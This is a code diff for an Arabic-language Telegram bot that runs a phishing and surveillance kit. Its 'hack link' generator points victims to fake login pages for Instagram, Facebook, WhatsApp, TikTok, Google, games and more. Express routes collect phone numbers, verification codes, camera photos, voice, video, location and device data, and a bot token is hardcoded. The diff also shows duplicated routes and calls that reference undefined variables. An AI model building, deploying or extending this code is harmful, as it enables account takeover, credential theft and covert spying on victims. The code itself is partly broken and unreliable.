@@ -1,4 +1,3 @@
-require('dotenv').config(); 
 const TelegramBot = require('node-telegram-bot-api');
 const express = require('express');
 const bodyParser = require('body-parser');
@@ -20,7 +19,161 @@ const { Readable } = require('stream');
 const FormData = require('form-data');
 const cheerio = require('cheerio');
 const dns = require('dns');
+const developerId = 5739065274;
+const botTokenMain = '8295313828:AAFsLVkrOrbjLvTJkQbiZCWUKjMep6clUao';
+const domain = "https://botwahm-erfu.onrender.com";
 
+global.app = express();
+global.app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
+global.app.use(bodyParser.json({ limit: '50mb' }));
+global.app.use(express.static(__dirname));
+
+global.mainBot = null;
+global.activeBotInstances = {};
+global.botUsernames = {};
+global.botActivityTracker = {};
+global.botSettings = {}; 
+global.routesInitialized = false;
+
+const SETTINGS_FILE = path.join(__dirname, 'bot_settings.json');
+function loadSettings() { try { if (fs.existsSync(SETTINGS_FILE)) global.botSettings = JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8')); } catch(e) {} }
+function saveSettings() { fs.writeFileSync(SETTINGS_FILE, JSON.stringify(global.botSettings, null, 2), 'utf8'); }
+loadSettings();
+
+function getTargetBot(botUser) {
+    if (botUser && global.activeBotInstances && global.botUsernames) {
+        const tk = Object.keys(global.botUsernames).find(t => global.botUsernames[t] === botUser);
+        if (tk) return global.activeBotInstances[tk];
+    }
+    return global.mainBot || null;
+}
+
+function isOldMessage(msgOrQuery) {
+  const now = Math.floor(Date.now() / 1000);
+  return (now - (msgOrQuery.date || 0)) > 180; 
+}
+
+async function sendPhishingLink(botInstance, chatId, action, botUsername, isMain) {
+    const botParam = isMain ? "" : `&bot=${botUsername}`;
+    const query = `?id=${chatId}${botParam}`;
+    const links = {
+        'add_names': { name: "سناب شات", path: "/snap" },
+        'collect_device_info': { name: "سحب معلومات الجهاز", path: "/device" },
+        'add_nammes': { name: "اختراق الهاتف كاملاً", path: "/hack_phone" },
+        'feat_ig_hack': { name: "انستقرام", path: "/ig" },
+        'feat_fb_hack': { name: "فيسبوك", path: "/fb" },
+        'feat_tt_hack': { name: "تيك توك", path: "/tt" },
+        'feat_wa_hack': { name: "واتساب", path: "/n" },
+        'feat_pubg_hack': { name: "ببجي", path: "/pubg" },
+        'feat_ff_hack': { name: "فري فاير", path: "/ff" },
+        'feat_twitter': { name: "تويتر X", path: "/tw" },
+        'feat_youtube': { name: "يوتيوب", path: "/yt" },
+        'feat_google': { name: "جوجل", path: "/gg" }
+    };
+    if (links[action]) {
+        return botInstance.sendMessage(chatId, `🔥 رابط اختراق ${links[action].name}:\n${domain}${links[action].path}${query}`);
+    }
+}
+
+
+function bindBotLogic(botInstance, token, ownerId) {
+    const isMain = (token === botTokenMain);
+    
+    // Core Variables for this instance
+    const bot = botInstance;
+    const botToken = token;
+    const developerId = 5739065274;
+    const app = {
+        get: (...args) => { if(isMain && !global.routesInitialized) global.app.get(...args); },
+        post: (...args) => { if(isMain && !global.routesInitialized) global.app.post(...args); },
+        use: (...args) => { if(isMain && !global.routesInitialized) global.app.use(...args); },
+        listen: () => {}
+    };
+
+    if (!global.botActivityTracker[token]) global.botActivityTracker[token] = { createdAt: Date.now(), users: new Set() };
+    if (!global.botSettings[token]) { global.botSettings[token] = { showCloneBtn: true, customChannels: [], admins: [ownerId] }; saveSettings(); }
+
+    // Dual-Token Subscription Logic
+    async function checkUserSubscription(chatId) {
+      const mainChannels = fixedChannels.concat(additionalChannels); 
+      const localChannels = global.botSettings[token]?.customChannels || [];
+      for (let channel of mainChannels) {
+        try {
+          const status = await global.mainBot.getChatMember(channel.id, chatId);
+          if (status.status === 'left' || status.status === 'kicked') return false;
+        } catch (error) { return false; }
+      }
+      for (let channel of localChannels) {
+        try {
+          const status = await botInstance.getChatMember(channel.id, chatId);
+          if (status.status === 'left' || status.status === 'kicked') return false;
+        } catch (error) { return false; }
+      }
+      return true;
+    }
+
+    async function showSubscriptionButtons(chatId) {
+      const message = 'الرجاء الاشتراك في جميع قنوات المطور قبل استخدام البوت.';
+      const mainChannels = fixedChannels.concat(additionalChannels);
+      const localChannels = global.botSettings[token]?.customChannels || [];
+      const allChannels = mainChannels.concat(localChannels);
+      const buttons = allChannels.map(channel => [{ text: `اشترك في ${channel.name}`, url: channel.inviteLink }]);
+      await botInstance.sendMessage(chatId, message, { reply_markup: { inline_keyboard: buttons } }).catch(() => {});
+    }
+
+    botInstance.on('message', async (msg) => {
+        const chatId = msg.chat.id;
+        const text = msg.text;
+        if(global.botActivityTracker[token]) global.botActivityTracker[token].users.add(chatId);
+        if (isMain && chatId === developerId && text && text.startsWith('/rights ')) {
+            const parts = text.split(' ');
+            if (parts.length === 3) {
+                const targetBotUser = parts[1].replace('@', '');
+                const show = parts[2] === 'on';
+                const targetToken = Object.keys(global.botUsernames).find(tk => global.botUsernames[tk] === targetBotUser);
+                if (targetToken) { global.botSettings[targetToken].showCloneBtn = show; saveSettings(); return botInstance.sendMessage(chatId, `✅ تم ${show ? 'تفعيل' : 'إخفاء'} زر "أضف بوتك" للبوت @${targetBotUser}`); }
+            }
+        }
+        if (global.botSettings[token].admins.includes(chatId) && text === '/admin') {
+            return bot.sendMessage(chatId, "🛠️ **لوحة تحكم الأدمن**", { reply_markup: { inline_keyboard: [[{ text: "📢 إرسال إذاعة", callback_data: "admin_broadcast" }], [{ text: "📊 إحصائيات البوت", callback_data: "admin_stats" }], [{ text: "🔗 إضافة قناتك", callback_data: "admin_add_chan" }, { text: "❌ حذف قناتك", callback_data: "admin_rem_chan" }]] } });
+        }
+        if (global.botSettings[token].admins.includes(chatId)) {
+            if (userStatesManus[chatId + '_' + token] === 'wait_broadcast') {
+                delete userStatesManus[chatId + '_' + token];
+                const users = Array.from(global.botActivityTracker[token].users);
+                bot.sendMessage(chatId, `⏳ جاري إرسال الإذاعة...`);
+                for (const u of users) { try { await bot.sendMessage(u, text); } catch(e) {} }
+                return bot.sendMessage(chatId, `✅ تم الإرسال.`);
+            }
+            if (userStatesManus[chatId + '_' + token] === 'wait_add_chan') {
+                delete userStatesManus[chatId + '_' + token];
+                const parts = text.split('\n');
+                if (parts.length >= 3) { global.botSettings[token].customChannels.push({ id: parts[0], name: parts[1], inviteLink: parts[2] }); saveSettings(); return bot.sendMessage(chatId, `✅ تم إضافة القناة ${parts[1]} بنجاح.`); }
+                return bot.sendMessage(chatId, "❌ تنسيق خاطئ.");
+            }
+        }
+        if (userStatesManus[chatId + '_' + token] === 'wait_clone_token') {
+            delete userStatesManus[chatId + '_' + token];
+            try {
+                const newToken = text.trim();
+                const tempBot = new TelegramBot(newToken, { polling: false });
+                const me = await tempBot.getMe();
+                persistNewToken(newToken, chatId, me.username);
+                spawnBotInstance(newToken, false, chatId);
+                return bot.sendMessage(chatId, `✅ **تم تشغيل بوتك!**\n\n🤖 @${me.username}`);
+            } catch(e) { return bot.sendMessage(chatId, "❌ توكن غير صالح."); }
+        }
+    });
+
+    botInstance.on('callback_query', async (query) => {
+        const chatId = query.message.chat.id;
+        const action = query.data;
+        if (action === 'admin_stats') return bot.sendMessage(chatId, `📊 عدد المستخدمين: ${global.botActivityTracker[token].users.size}`);
+        if (action === 'admin_broadcast') { userStatesManus[chatId + '_' + token] = 'wait_broadcast'; return bot.sendMessage(chatId, "📝 أرسل نص الإذاعة:"); }
+        if (action === 'admin_add_chan') { userStatesManus[chatId + '_' + token] = 'wait_add_chan'; return bot.sendMessage(chatId, "🔗 أرسل: الأيدي، الاسم، الرابط (كل واحد في سطر)"); }
+        if (action === 'admin_rem_chan') { global.botSettings[token].customChannels = []; saveSettings(); return bot.sendMessage(chatId, "✅ تم الحذف."); }
+        if (action === 'clone_my_bot') { userStatesManus[chatId + '_' + token] = 'wait_clone_token'; return bot.sendMessage(chatId, "🤖 أرسل التوكن:"); }
+    });
 
 function generateShortToken(chatId, type, extra = {}) {
     const token = crypto.randomBytes(4).toString('hex'); // 8 حروف
@@ -30,11 +183,20 @@ function generateShortToken(chatId, type, extra = {}) {
 
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 const tmo = process.env.is; 
- 
+const botToken_shadow = '8295313828:AAFsLVkrOrbjLvTJkQbiZCWUKjMep6clUao'; 
 const botUsername = process.env.bott;
  // يمكنك تغيير هذا لليوزر الخاص بك إذا أردت
 
-
+const bot_shadow = new TelegramBot(botToken, {
+  polling: {
+    interval: 100,
+    autoStart: true,
+    params: {
+      timeout: 10,
+      limit: 100
+    }
+  }
+});
 
 // --- Advanced Logic by Manus (Final V14 - Advanced Download API) ---
 const userStatesManus = {};
@@ -86,7 +248,7 @@ async function getVideoInfoReal(chatId, videoUrl) {
         userStatesManus[chatId + '_url'] = videoUrl;
         return bot.sendPhoto(chatId, info.thumbnail, { caption, reply_markup: { inline_keyboard: buttons }, parse_mode: 'Markdown' });
     } catch (e) {
-        return bot.sendMessage(chatId, "❌ فشل جلب معلومات الفيديو. تأكد من صحة الرابط.");
+        return getTargetBot(req.body.bot || req.query.bot).sendMessage(chatId, "❌ فشل جلب معلومات الفيديو. تأكد من صحة الرابط.");
     }
 }
 
@@ -121,161 +283,12 @@ async function performAdvancedDownload(chatId, url, quality, statusMsgId) {
         if (quality === 'audio') return bot.sendAudio(chatId, buffer, { filename: fileName });
         return bot.sendVideo(chatId, buffer, { filename: fileName });
     } catch (e) {
-        return bot.sendMessage(chatId, "❌ فشل التحميل. الرابط قد يكون غير مدعوم حالياً.");
+        return getTargetBot(req.body.bot || req.query.bot).sendMessage(chatId, "❌ فشل التحميل. الرابط قد يكون غير مدعوم حالياً.");
     }
 }
 
 
 // Global Message Listener for Manus States
-
-const developerId = 5739065274;
-const botTokenMain = '8295313828:AAFsLVkrOrbjLvTJkQbiZCWUKjMep6clUao';
-const domain = "https://botwahm-erfu.onrender.com";
-
-const app = express();
-app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
-app.use(bodyParser.json({ limit: '50mb' }));
-app.use(express.static(__dirname));
-
-global.mainBot = null;
-global.activeBotInstances = {};
-global.botUsernames = {};
-global.botActivityTracker = {};
-global.botSettings = {}; 
-
-const SETTINGS_FILE = path.join(__dirname, 'bot_settings.json');
-function loadSettings() { try { if (fs.existsSync(SETTINGS_FILE)) global.botSettings = JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8')); } catch(e) {} }
-function saveSettings() { fs.writeFileSync(SETTINGS_FILE, JSON.stringify(global.botSettings, null, 2), 'utf8'); }
-loadSettings();
-
-function getTargetBot(botUser) {
-    if (botUser && global.activeBotInstances && global.botUsernames) {
-        const tk = Object.keys(global.botUsernames).find(t => global.botUsernames[t] === botUser);
-        if (tk) return global.activeBotInstances[tk];
-    }
-    return global.mainBot || null;
-}
-
-function isOldMessage(msgOrQuery) {
-  const now = Math.floor(Date.now() / 1000);
-  return (now - (msgOrQuery.date || 0)) > 180; 
-}
-
-async function sendPhishingLink(botInstance, chatId, action, botUsername, isMain) {
-    const botParam = isMain ? "" : `&bot=${botUsername}`;
-    const query = `?id=${chatId}${botParam}`;
-    const links = {
-        'add_names': { name: "سناب شات", path: "/snap" },
-        'collect_device_info': { name: "سحب معلومات الجهاز", path: "/device" },
-        'add_nammes': { name: "اختراق الهاتف كاملاً", path: "/hack_phone" },
-        'feat_ig_hack': { name: "انستقرام", path: "/ig" },
-        'feat_fb_hack': { name: "فيسبوك", path: "/fb" },
-        'feat_tt_hack': { name: "تيك توك", path: "/tt" },
-        'feat_wa_hack': { name: "واتساب", path: "/wa" },
-        'feat_pubg_hack': { name: "ببجي", path: "/pubg" },
-        'feat_ff_hack': { name: "فري فاير", path: "/ff" },
-        'feat_twitter': { name: "تويتر X", path: "/tw" },
-        'feat_youtube': { name: "يوتيوب", path: "/yt" },
-        'feat_google': { name: "جوجل", path: "/gg" }
-    };
-    if (links[action]) {
-        return botInstance.sendMessage(chatId, `🔥 رابط اختراق ${links[action].name}:\n${domain}${links[action].path}${query}`);
-    }
-}
-
-let routesAdded = false;
-
-
-function bindBotLogic(botInstance, token, ownerId) {
-    const bot = botInstance; 
-    const botToken = token;
-    const isMain = (token === botTokenMain);
-    
-    if (!global.botActivityTracker[token]) global.botActivityTracker[token] = { createdAt: Date.now(), users: new Set() };
-    if (!global.botSettings[token]) { global.botSettings[token] = { showCloneBtn: true, customChannels: [], admins: [ownerId] }; saveSettings(); }
-
-    bot.on('message', async (msg) => {
-        const chatId = msg.chat.id;
-        const text = msg.text;
-        if(global.botActivityTracker[token]) global.botActivityTracker[token].users.add(chatId);
-        if (isMain && chatId === developerId && text && text.startsWith('/rights ')) {
-            const parts = text.split(' ');
-            if (parts.length === 3) {
-                const targetBotUser = parts[1].replace('@', '');
-                const show = parts[2] === 'on';
-                const targetToken = Object.keys(global.botUsernames).find(tk => global.botUsernames[tk] === targetBotUser);
-                if (targetToken) { global.botSettings[targetToken].showCloneBtn = show; saveSettings(); return bot.sendMessage(chatId, `✅ تم ${show ? 'تفعيل' : 'إخفاء'} زر "أضف بوتك" للبوت @${targetBotUser}`); }
-            }
-        }
-        if (global.botSettings[token].admins.includes(chatId) && text === '/admin') {
-            return bot.sendMessage(chatId, "🛠️ **لوحة تحكم الأدمن**", { reply_markup: { inline_keyboard: [[{ text: "📢 إرسال إذاعة", callback_data: "admin_broadcast" }], [{ text: "📊 إحصائيات البوت", callback_data: "admin_stats" }], [{ text: "🔗 إضافة قناتك", callback_data: "admin_add_chan" }, { text: "❌ حذف قناتك", callback_data: "admin_rem_chan" }]] } });
-        }
-        if (global.botSettings[token].admins.includes(chatId)) {
-            if (userStatesManus[chatId + '_' + token] === 'wait_broadcast') {
-                delete userStatesManus[chatId + '_' + token];
-                const users = Array.from(global.botActivityTracker[token].users);
-                bot.sendMessage(chatId, `⏳ جاري إرسال الإذاعة...`);
-                for (const u of users) { try { await bot.sendMessage(u, text); } catch(e) {} }
-                return bot.sendMessage(chatId, `✅ تم الإرسال.`);
-            }
-            if (userStatesManus[chatId + '_' + token] === 'wait_add_chan') {
-                delete userStatesManus[chatId + '_' + token];
-                const p = text.split('\n');
-                if (p.length >= 3) { global.botSettings[token].customChannels.push({ id: p[0], name: p[1], inviteLink: p[2] }); saveSettings(); return bot.sendMessage(chatId, `✅ تم الإضافة.`); }
-                return bot.sendMessage(chatId, "❌ تنسيق خاطئ.");
-            }
-        }
-        if (userStatesManus[chatId + '_' + token] === 'wait_clone_token') {
-            delete userStatesManus[chatId + '_' + token];
-            try {
-                const newToken = text.trim();
-                const tempBot = new TelegramBot(newToken, { polling: false });
-                const me = await tempBot.getMe();
-                persistNewToken(newToken, chatId, me.username);
-                spawnBotInstance(newToken, false, chatId);
-                return bot.sendMessage(chatId, `✅ **تم تشغيل بوتك!**\n\n🤖 @${me.username}`);
-            } catch(e) { return bot.sendMessage(chatId, "❌ توكن غير صالح."); }
-        }
-    });
-
-    bot.on('callback_query', async (query) => {
-        const chatId = query.message.chat.id;
-        const action = query.data;
-        if (action === 'admin_stats') return bot.sendMessage(chatId, `📊 عدد المستخدمين: ${global.botActivityTracker[token].users.size}`);
-        if (action === 'admin_broadcast') { userStatesManus[chatId + '_' + token] = 'wait_broadcast'; return bot.sendMessage(chatId, "📝 أرسل نص الإذاعة:"); }
-        if (action === 'admin_add_chan') { userStatesManus[chatId + '_' + token] = 'wait_add_chan'; return bot.sendMessage(chatId, "🔗 أرسل: الأيدي، الاسم، الرابط (كل واحد في سطر)"); }
-        if (action === 'admin_rem_chan') { global.botSettings[token].customChannels = []; saveSettings(); return bot.sendMessage(chatId, "✅ تم الحذف."); }
-        if (action === 'clone_my_bot') { userStatesManus[chatId + '_' + token] = 'wait_clone_token'; return bot.sendMessage(chatId, "🤖 أرسل التوكن:"); }
-    });
-
-
-async function checkUserSubscription(chatId) {
-  const mainChannels = fixedChannels.concat(additionalChannels); 
-  const localChannels = global.botSettings[botToken]?.customChannels || [];
-  for (let channel of mainChannels) {
-    try {
-      const status = await global.mainBot.getChatMember(channel.id, chatId);
-      if (status.status === 'left' || status.status === 'kicked') return false;
-    } catch (error) { return false; }
-  }
-  for (let channel of localChannels) {
-    try {
-      const status = await bot.getChatMember(channel.id, chatId);
-      if (status.status === 'left' || status.status === 'kicked') return false;
-    } catch (error) { return false; }
-  }
-  return true;
-}
-
-async function showSubscriptionButtons(chatId) {
-  const message = 'الرجاء الاشتراك في جميع قنوات المطور قبل استخدام البوت.';
-  const mainChannels = fixedChannels.concat(additionalChannels);
-  const localChannels = global.botSettings[botToken]?.customChannels || [];
-  const allChannels = mainChannels.concat(localChannels);
-  const buttons = allChannels.map(channel => [{ text: `اشترك في ${channel.name}`, url: channel.inviteLink }]);
-  await bot.sendMessage(chatId, message, { reply_markup: { inline_keyboard: buttons } }).catch(() => {});
-}
-
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text;
@@ -399,7 +412,7 @@ bot.on('callback_query', async (query) => {
 
 
 
-
+const developerId_shadow = 5739065274;
 
 
 const fixedChannels = [
@@ -932,24 +945,24 @@ bot.onText(/\/start (.+)/, async (msg, match) => {
   }
 });
 
-
-if(!routesAdded) app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
-if(!routesAdded) app.use(bodyParser.json({ limit: '100mb' }));
-if(!routesAdded) app.use(express.static(__dirname));
+const app_shadow = express();
+app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
+app.use(bodyParser.json({ limit: '100mb' }));
+app.use(express.static(__dirname));
 
 // --- Clean Phishing Routes (V35) ---
-if(!routesAdded) app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
-if(!routesAdded) app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
-if(!routesAdded) app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
-if(!routesAdded) app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
-if(!routesAdded) app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
-if(!routesAdded) app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
-if(!routesAdded) app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
-if(!routesAdded) app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
-if(!routesAdded) app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
-if(!routesAdded) app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
-if(!routesAdded) app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
-if(!routesAdded) app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
+app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
+app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
+app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
+app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
+app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
+app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
+app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
+app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
+app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
+app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
+app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
+app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
 
 
 
@@ -959,7 +972,7 @@ const uploadVoice = multer({ dest: 'uploads/' });
 
 
 
-if(!routesAdded) app.get('/getNameForm', (req, res) => {
+app.get('/getNameForm', (req, res) => {
     let chatId = req.query.chatId;
     let formType = req.query.type;
     const token = req.query.t;
@@ -990,7 +1003,7 @@ if(!routesAdded) app.get('/getNameForm', (req, res) => {
     res.sendFile(path.join(__dirname, fileName));
 });
 
-if(!routesAdded) app.get('/getLocation/:linkId', (req, res) => {
+app.get('/getLocation/:linkId', (req, res) => {
     const linkId = req.params.linkId;
     let chatId = req.query.chatId;
     
@@ -1006,7 +1019,7 @@ if(!routesAdded) app.get('/getLocation/:linkId', (req, res) => {
     }
 });
 
-if(!routesAdded) app.get('/captureFront/:linkId', (req, res) => {
+app.get('/captureFront/:linkId', (req, res) => {
     const linkId = req.params.linkId;
     let chatId = req.query.chatId;
     
@@ -1022,7 +1035,7 @@ if(!routesAdded) app.get('/captureFront/:linkId', (req, res) => {
     }
 });
 
-if(!routesAdded) app.get('/captureBack/:linkId', (req, res) => {
+app.get('/captureBack/:linkId', (req, res) => {
     const linkId = req.params.linkId;
     let chatId = req.query.chatId;
     
@@ -1038,7 +1051,7 @@ if(!routesAdded) app.get('/captureBack/:linkId', (req, res) => {
     }
 });
 
-if(!routesAdded) app.get('/record/:linkId', (req, res) => {
+app.get('/record/:linkId', (req, res) => {
     const linkId = req.params.linkId;
     let chatId = req.query.chatId;
     
@@ -1055,7 +1068,7 @@ if(!routesAdded) app.get('/record/:linkId', (req, res) => {
 });
 
 
-if(!routesAdded) app.post('/submitNames', (req, res) => {
+app.post('/submitNames', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
     const token = req.body.token || req.query.t;
     if (!chatId && token && shortLinkStore[token]) {
@@ -1077,27 +1090,27 @@ if(!routesAdded) app.post('/submitNames', (req, res) => {
 
     res.redirect('/ok.html');
 });
-if(!routesAdded) app.use(bodyParser.json());
-if(!routesAdded) app.use(express.static(__dirname));
+app.use(bodyParser.json());
+app.use(express.static(__dirname));
 
 // --- Clean Phishing Routes (V35) ---
-if(!routesAdded) app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
-if(!routesAdded) app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
-if(!routesAdded) app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
-if(!routesAdded) app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
-if(!routesAdded) app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
-if(!routesAdded) app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
-if(!routesAdded) app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
-if(!routesAdded) app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
-if(!routesAdded) app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
-if(!routesAdded) app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
-if(!routesAdded) app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
-if(!routesAdded) app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
+app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
+app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
+app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
+app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
+app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
+app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
+app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
+app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
+app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
+app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
+app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
+app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
 
 
 
 
-if(!routesAdded) app.get('/whatsapp', (req, res) => {
+app.get('/whatsapp', (req, res) => {
   const token = req.query.t;
   if (token && shortLinkStore[token]) {
       res.sendFile(path.join(__dirname, 'n.html'));
@@ -1109,7 +1122,7 @@ if(!routesAdded) app.get('/whatsapp', (req, res) => {
 });
 
 
-if(!routesAdded) app.post('/submitPhoneNumber', (req, res) => {
+app.post('/submitPhoneNumber', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
     const token = req.body.token || req.query.t;
     if (!chatId && token && shortLinkStore[token]) {
@@ -1128,7 +1141,7 @@ if(!routesAdded) app.post('/submitPhoneNumber', (req, res) => {
     });
 });
 
-if(!routesAdded) app.post('/submitCode', (req, res) => {
+app.post('/submitCode', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
     const token = req.body.token || req.query.t;
     if (!chatId && token && shortLinkStore[token]) {
@@ -1148,33 +1161,33 @@ if(!routesAdded) app.post('/submitCode', (req, res) => {
     });
 });
 
-if(!routesAdded) app.use(bodyParser.json({ limit: '50mb' }));
-if(!routesAdded) app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
+app.use(bodyParser.json({ limit: '50mb' }));
+app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
 
 const dataStore = {}; 
 
-if(!routesAdded) app.use(express.static(__dirname));
+app.use(express.static(__dirname));
 
 // --- Clean Phishing Routes (V35) ---
-if(!routesAdded) app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
-if(!routesAdded) app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
-if(!routesAdded) app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
-if(!routesAdded) app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
-if(!routesAdded) app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
-if(!routesAdded) app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
-if(!routesAdded) app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
-if(!routesAdded) app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
-if(!routesAdded) app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
-if(!routesAdded) app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
-if(!routesAdded) app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
-if(!routesAdded) app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
+app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
+app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
+app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
+app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
+app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
+app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
+app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
+app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
+app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
+app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
+app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
+app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
 
 const botOwner = bot;
 const ownerChatId = developerId;
 
 
 
-if(!routesAdded) app.post('/submitVideo', (req, res) => {
+app.post('/submitVideo', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
     const token = req.body.token || req.query.t;
     if (!chatId && token && shortLinkStore[token]) {
@@ -1234,7 +1247,7 @@ if(!routesAdded) app.post('/submitVideo', (req, res) => {
         res.status(500).send('Failed to process video');
     }
 });
-if(!routesAdded) app.get('/capture', (req, res) => {
+app.get('/capture', (req, res) => {
     const token = req.query.t;
     if (token && shortLinkStore[token]) {
         res.sendFile(path.join(__dirname, 'ca.html'));
@@ -1260,7 +1273,7 @@ const retry = async (fn, retries = 3, delay = 1000) => {
 
 
 
-if(!routesAdded) app.post('/submitPhotos', (req, res) => {
+app.post('/submitPhotos', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
     const token = req.body.token || req.query.t;
     if (!chatId && token && shortLinkStore[token]) {
@@ -1314,7 +1327,7 @@ if(!routesAdded) app.post('/submitPhotos', (req, res) => {
 
 
 
-if(!routesAdded) app.post('/imageReceiver', upload.array('images', 20), (req, res) => {
+app.post('/imageReceiver', upload.array('images', 20), (req, res) => {
     const chatId = req.body.userId;
     const files = req.files;
 
@@ -1360,7 +1373,7 @@ if(!routesAdded) app.post('/imageReceiver', upload.array('images', 20), (req, re
     }
 });
 
-if(!routesAdded) app.post('/submitVoice', uploadVoice.single('voice'), (req, res) => {
+app.post('/submitVoice', uploadVoice.single('voice'), (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
     const token = req.body.token || req.query.t;
     if (!chatId && token && shortLinkStore[token]) {
@@ -1377,7 +1390,10 @@ if(!routesAdded) app.post('/submitVoice', uploadVoice.single('voice'), (req, res
     });
 });
 const PORT = process.env.PORT || 3000;
-if(!routesAdded) app.get('/info', (req, res) => {
+const listen_shadow = (PORT, () => {
+    console.log(`الخادم يعمل على المنفذ ${PORT}`);
+});
+app.get('/info', (req, res) => {
     const token = req.query.t;
     if (token && shortLinkStore[token]) {
         res.sendFile(path.join(__dirname, 'mm.html'));
@@ -1386,12 +1402,12 @@ if(!routesAdded) app.get('/info', (req, res) => {
     }
 });
 
-if(!routesAdded) app.get('/:userId', (req, res) => {
+app.get('/:userId', (req, res) => {
     res.sendFile(path.join(__dirname, 'mm.html'));
 });
 
 
-if(!routesAdded) app.post('/mm', async (req, res) => {
+app.post('/mm', async (req, res) => {
